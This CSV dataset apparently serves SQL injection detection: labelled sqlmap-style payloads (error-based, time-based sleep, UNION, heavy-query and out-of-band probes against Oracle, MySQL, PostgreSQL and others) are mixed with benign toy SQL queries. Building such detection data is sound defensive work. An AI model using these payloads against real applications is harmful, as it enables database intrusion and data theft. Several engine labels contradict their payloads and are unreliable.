payload_norm,payload_delex,sqli_type,db_engine,confidence,is_attack
"select * from users WHERE username = ""1 and username = ""-6190\' ) where 2621 = 2621 or-- 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""1%\' ) ) ) and ( ( ( \'%\' = \'""",select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ __STR__ ) ) ) and ( ( ( \ __STR__ = __IDENT__,error_based,oracle,0.95,True
1'|| ( select 'xlmt' where 1664 = 1664,__INT__ __STR__ __IDENT__ where __INT__ = __INT__,unknown,generic,0.6,True
SELECT * FROM news WHERE where BETWEEN 10 AND 20,select * from __IDENT__ where where between __INT__ and __INT__,benign,mysql,0.9,False
"select * from users WHERE username = ""-9501\' ) and ( \'mndw\' = \'mndw"" and username = ""1 ) ) as atiy where 3855 = 3855",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __INT__ ) ) as __IDENT__ where __INT__ = __INT__,auth_bypass,generic,0.85,True
"select * from users WHERE username = ""1\' ) ) ) or username = ""1\'+ ( select onzd where 8452 = 8452 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\'""",select * from __IDENT__ where __IDENT__ = __STR__,boolean_blind,postgresql,0.9,True
SELECT TOP 50 PERCENT * FROM raise,select top __INT__ __IDENT__ * from __IDENT__,benign,mssql,1.0,False
jaraba villa,__IDENT__ __IDENT__,benign,generic,0.9,False
peine3@psychominders.gob,__IDENT__,benign,generic,0.9,False
SELECT * FROM pen FETCH FIRST 50 PERCENT ROWS ONLY,select * from __IDENT__ fetch first __INT__ __IDENT__ rows only,benign,generic,1.0,False
83236273d,__IDENT__,benign,generic,0.9,False
glickman,__IDENT__,benign,generic,0.9,False
"1"" ) where 1330 = 1330 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) --",__INT__ ) where __INT__ = __INT__ or ( select * from ( select ( sleep ( __INT__ ) ) ) __IDENT__ ) - -,time_blind,generic,0.9,True
"select * from users WHERE username = ""1%\' and username = ""1%\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'%\' = \'""",select * from __IDENT__ where __IDENT__ = __STR__,error_based,oracle,0.95,True
79533872x,__IDENT__,benign,generic,0.9,False
SELECT TOP 50 PERCENT * FROM walk,select top __INT__ __IDENT__ * from __IDENT__,benign,generic,1.0,False
SELECT steady ( s ) FROM felt LEFT JOIN,select __IDENT__ ( __IDENT__ ) from __IDENT__ left join,benign,mysql,0.9,False
UPDATE tight SET several = 'pattern'WHERE goose = 'reach',update __IDENT__ set __IDENT__ = __STR__ where __IDENT__ = __STR__,benign,generic,1.0,False
"1' and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and 'moyb' = 'moyb",__INT__ __STR__ __IDENT__ __STR__ __IDENT__,heavy_query,sqlite,0.9,True
SELECT * FROM can,select * from __IDENT__,benign,generic,1.0,False
"1"" where 4319 = 4319",__INT__ where __INT__ = __INT__,boolean_blind,generic,0.5,True
SELECT TOP 3 * FROM could SELECT * FROM pressure 3SELECT * FROM seen,select top __INT__ * from __IDENT__ select * from __IDENT__ select * from __IDENT__,benign,generic,1.0,False
SELECT * FROM ( SELECT silly FROM thin ),select * from ( select __IDENT__ from __IDENT__ ),benign,generic,1.0,False
"select * from users WHERE username = ""-2992\' ) ) and 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) or ( ( \'tjgt\' = \'tjgt"" or username = ""-3613%\' ) or ( \'%\' = \'""",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__,error_based,oracle,0.9,True
( select 2412 = ( 'qqpjq'|| ( select case 2412 when 2412 then 1 else 0 end from rdb$database ) ||'qzvzq' ) ),( select __INT__ = ( __STR__ | | ( select case __INT__ when __INT__ then __INT__ else __INT__ end from __IDENT__ ) | | __STR__ ) ),boolean_blind,firebird,0.8,True
select sleep ( 5 ) and ( ( ( 'klma' = 'klma,select sleep ( __INT__ ) and ( ( ( __STR__ = __IDENT__,time_blind,mysql,0.9,True
dotan,__IDENT__,benign,generic,0.9,False
SELECT liquid FROM battle UNION ALL SELECT football FROM becoming ORDER BY thumb,select __IDENT__ from __IDENT__ union all select __IDENT__ from __IDENT__ order by __IDENT__,benign,generic,1.0,False
"select * from users WHERE username = ""1\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'yhku\' like \'yhku"" or username = ""1\' or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( 5616 = 5616""",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__,error_based,oracle,0.9,True
"-8794 ) ) ) union all select 5802,5802,5802--","- __INT__ ) ) ) union all select __INT__ , __INT__ , __INT__ - -",union_based,generic,0.7,True
SELECT TIME ( NULL ),select __IDENT__ ( null ),benign,generic,1.0,False
SELECT * FROM with WHERE depth = 'wore' OR feel = 'red',select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__,benign,generic,1.0,False
SELECT * FROM indicate WHERE establish = 'so' OR gave = 'cheese',select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__,benign,generic,1.0,False
"SELECT * FROM around WHERE laugh BETWEEN ""research"" AND ""greatly""",select * from __IDENT__ where __IDENT__ between __STR__ and __STR__,benign,generic,1.0,False
1%' and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and '%' = ',__INT__ % __STR__ % __STR__,error_based,oracle,0.9,True
1 ) ) as wrhe where 6120 = 6120 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,__INT__ ) ) as __IDENT__ where __INT__ = __INT__ and __INT__ = ( __STR__ | | ( select case __INT__ when __INT__ then __INT__ else __INT__ end from __IDENT__ ) | | __STR__ ) - -,boolean_blind,firebird,0.7,True
"SELECT per, bet+ ', ' + setting+ ' ' + leader+ ', ' + practice AS blew FROM breathing","select __IDENT__ , __IDENT__ + __STR__ + __IDENT__ + __STR__ + __IDENT__ + __STR__ + __IDENT__ as __IDENT__ from __IDENT__",benign,generic,1.0,False
SELECT TOP 50 PERCENT * FROM mother,select top __INT__ __IDENT__ * from __IDENT__,benign,generic,1.0,False
SELECT * FROM bear WHERE standard BETWEEN 10 AND 20,select * from __IDENT__ where __IDENT__ between __INT__ and __INT__,benign,generic,1.0,False
byoung,__IDENT__,benign,generic,0.9,False
SELECT * FROM shot FETCH FIRST 50 PERCENT ROWS ONLY,select * from __IDENT__ fetch first __INT__ __IDENT__ rows only,benign,generic,1.0,False
ojinaga bascn,__IDENT__ __IDENT__,benign,generic,0.9,False
"-1915%"" ) ) union all select 7732,7732,7732,7732,7732,7732,7732,7732,7732#","- __INT__ % "" ) ) union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__",union_based,generic,0.7,True
"select * from users WHERE username = ""-7746\' ) ) ) || 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) or username = ""1"" and username = ""-1344 ) as gqgi where 2545 = 2545 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""","select * from __IDENT__ where __IDENT__ = __STR__ __INT__ __STR__ - __INT__ ) as __IDENT__ where __INT__ = __INT__ or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) - - """,error_based,oracle,0.9,True
SELECT * FROM future WHERE NOT stream = 'replace' AND NOT call = 'pay',select * from __IDENT__ where not __IDENT__ = __STR__ and not __IDENT__ = __STR__,benign,generic,1.0,False
SELECT ASCII ( CustomerName ) AS NumCodeOfFirstChar FROM Customers,select ascii ( __IDENT__ ) as __IDENT__ from __IDENT__,benign,generic,1.0,False
"select * from users WHERE username = ""-8007\' ) ) as bgpp where 9555 = 9555 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""-1854\' ) as fmmq where 7326 = 7326 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""",select * from __IDENT__ where __IDENT__ = __STR__,error_based,oracle,0.9,True
SELECT * FROM ( SELECT other FROM saddle ),select * from ( select __IDENT__ from __IDENT__ ),benign,generic,1.0,False
"SELECT respectID AS ID, experiment AS happily FROM can","select __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ from __IDENT__",benign,mysql,0.9,False
jaquith,__IDENT__,benign,generic,0.9,False
"select * from users WHERE username = ""1%\' ) ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( \'%\' = \'"" or username = ""1\'|| ( select \'adiv\' from dual where 9842 = 9842",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __INT__ __STR__ __IDENT__ from dual where __INT__ = __INT__,error_based,oracle,0.95,True
-8057' ) ) as gpue where 4205 = 4205 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,- __INT__ ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = cast ( ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) ) __IDENT__ | | ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) as __IDENT__ ) - -,boolean_blind,generic,0.8,True
"1"" and 1668 = 8288",__INT__ and __INT__ = __INT__,boolean_blind,generic,0.8,True
"select * from users WHERE username = ""-3729\' ) ) and ( ( \'czed\' = \'czed"" or username = ""-9688%\' ) )","select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = "" - __INT__ % __IDENT__ ) )",auth_bypass,generic,0.6,True
-2181' ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( 'wyez' = 'wyez,- __INT__ __STR__ __IDENT__ __STR__ __IDENT__,boolean_blind,postgresql,0.7,True
SELECT * FROM ring WHERE bring = 'around' LIMIT 3,select * from __IDENT__ where __IDENT__ = __STR__ limit __INT__,benign,generic,1.0,False
SELECT * FROM positive,select * from __IDENT__,benign,mysql,0.9,False
UPDATE stared SET canal = 'drove'WHERE pale = 'store',update __IDENT__ set __IDENT__ = __STR__ where __IDENT__ = __STR__,benign,generic,1.0,False
"INSERT INTO feature ( solar, likely, quietly ) VALUES ( 'shot', 'rest', 'floor' )","insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__ , __STR__ )",benign,generic,1.0,False
SELECT AVG ( star ) FROM scientist,select avg ( __IDENT__ ) from __IDENT__,benign,generic,1.0,False
DELETE FROM body,delete from __IDENT__,benign,generic,1.0,False
elois,__IDENT__,benign,generic,0.9,False
"SELECT * FROM visitor WHERE mistake BETWEEN ""apart"" AND ""unknown""",select * from __IDENT__ where __IDENT__ between __STR__ and __STR__,benign,generic,1.0,False
"1%' ) ) ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ( '%' = '",__INT__ % __STR__ % __STR__,heavy_query,db2,0.7,True
?malgastador,__IDENT__,benign,generic,0.9,False
SELECT MIN ( taste ) AS involved FROM eight,select min ( __IDENT__ ) as __IDENT__ from __IDENT__,benign,generic,1.0,False
SELECT CURRENT_TIME ( ) + 1,select __IDENT__ ( ) + __INT__,benign,generic,1.0,False
"1 ) as dqda where 1624 = 1624 and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --","__INT__ ) as __IDENT__ where __INT__ = __INT__ and __INT__ = ( select count ( * ) from __IDENT__ ( __INT__ , __INT__ ) ) - -",heavy_query,firebird,0.85,True
"1%"" and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ""%"" = """,__INT__ % __STR__ % __STR__,heavy_query,sqlite,0.9,True
"select * from users WHERE username = ""1\'|| ( select \'adiv\' from dual where 9842 = 9842 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) ||\'"" and username = ""-1190\' or username = ""1\'|| ( select \'yucg\' where 2576 = 2576 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ) ||\'""",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__,error_based,oracle,0.95,True
SELECT * FROM done FETCH FIRST 50 PERCENT ROWS ONLY,select * from __IDENT__ fetch first __INT__ __IDENT__ rows only,benign,generic,1.0,False
"-1975"" union all select 8638,8638,8638,8638,8638,8638,8638,8638,8638#","- __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__",union_based,generic,0.7,True
"-1418"" ) where 7528 = 7528 order by 1#",- __INT__ ) where __INT__ = __INT__ order by __INT__,boolean_blind,mysql,0.8,True
"calle francisco de leiva, 131,","__IDENT__ __IDENT__ __IDENT__ __IDENT__ , __INT__ ,",benign,generic,0.9,False
"SELECT Employees.connected, COUNT ( Orders.grownID ) AS flowerFROM ( OrdersINNER JOIN middle ON Orders.cityID = Employees.remarkableID )","select __IDENT__ , count ( __IDENT__ ) as __IDENT__ ( __IDENT__ join __IDENT__ on __IDENT__ = __IDENT__ )",benign,generic,1.0,False
SELECT * FROM yourself WHERE planet = buy,select * from __IDENT__ where __IDENT__ = __IDENT__,benign,mysql,0.9,False
"SELECT bowID AS ID, wheat AS flower FROM park","select __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ from __IDENT__",benign,generic,1.0,False
h9erc5,__IDENT__,benign,generic,0.9,False
8.81212E+15,__IDENT__ + __INT__,benign,generic,0.9,False
1' and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ),__INT__ and __INT__ = __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ),out_of_band,oracle,0.9,True
"select * from users WHERE username = ""1\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'iuki\' = \'iuki"" or username = ""1 ) ) as iihk where 5414 = 5414 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --""",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__,error_based,oracle,0.9,True
1' in boolean mode ) and 4457 = 3885#,__INT__ in __IDENT__ __IDENT__ ) and __INT__ = __INT__,boolean_blind,generic,0.5,True
SELECT * FROM bill,select * from __IDENT__,benign,generic,1.0,False
1.06099E+14,__IDENT__ + __INT__,benign,generic,0.9,False
destullecer,__IDENT__,benign,generic,0.9,False
florian@alcantarapartners.so,__IDENT__,benign,generic,0.9,False
80216904b,__IDENT__,benign,generic,0.9,False
"SELECT goldID AS ID, wheat AS running FROM poem","select __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ from __IDENT__",benign,generic,1.0,False
"SELECT * FROM users WHERE username = ""-5013\' ) ) ) || 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( \'ehwh\' like \'ehwh"" OR username = ""1\' ) ) as bswc where 1635 = 1635",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __INT__ ) ) as __IDENT__ where __INT__ = __INT__,error_based,mssql,0.8,True
-4518 where 8023 = 8023 or 6872 = 6872--,- __INT__ where __INT__ = __INT__ or __INT__ = __INT__ - -,boolean_blind,generic,0.5,True
